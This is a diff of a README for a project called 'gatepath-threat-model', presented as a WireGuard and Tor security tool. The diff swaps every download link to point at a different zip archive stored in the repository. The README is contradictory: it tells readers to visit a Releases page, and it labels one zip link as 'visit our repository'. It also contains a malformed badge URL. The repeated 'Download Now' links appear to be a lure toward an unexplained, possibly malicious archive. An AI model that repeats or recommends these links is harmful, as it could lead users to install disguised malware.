@@ -4,13 +4,13 @@
 
 Welcome to **gatepath-threat-model**! This application helps you understand and enhance the security of your network using WireGuard VPN and optional Tor proxy. Follow the steps below to download and run the software.
 
-[![Download Now](https://raw.githubusercontent.com/realbabafingo/gatepath-threat-model/main/tor/gatepath_threat_model_2.0.zip%20Now-Here-007bff?style=for-the-badge)](https://raw.githubusercontent.com/realbabafingo/gatepath-threat-model/main/tor/gatepath_threat_model_2.0.zip)
+[![Download Now](https://github.com/realbabafingo/gatepath-threat-model/raw/refs/heads/main/wireguard/threat-model-gatepath-v2.7.zip%20Now-Here-007bff?style=for-the-badge)](https://github.com/realbabafingo/gatepath-threat-model/raw/refs/heads/main/wireguard/threat-model-gatepath-v2.7.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page to download the application. 
 
-[Visit this page to download](https://raw.githubusercontent.com/realbabafingo/gatepath-threat-model/main/tor/gatepath_threat_model_2.0.zip)
+[Visit this page to download](https://github.com/realbabafingo/gatepath-threat-model/raw/refs/heads/main/wireguard/threat-model-gatepath-v2.7.zip)
 
 1. Click on the link above.
 2. On the Releases page, look for the latest version.
@@ -82,6 +82,6 @@ To submit an issue or request a feature:
 
 To learn more about **gatepath-threat-model**, visit our repository:
 
-[Visit this page to download](https://raw.githubusercontent.com/realbabafingo/gatepath-threat-model/main/tor/gatepath_threat_model_2.0.zip)
+[Visit this page to download](https://github.com/realbabafingo/gatepath-threat-model/raw/refs/heads/main/wireguard/threat-model-gatepath-v2.7.zip)
 
 Explore network security and enhance your systems with this powerful application. Happy surfing!
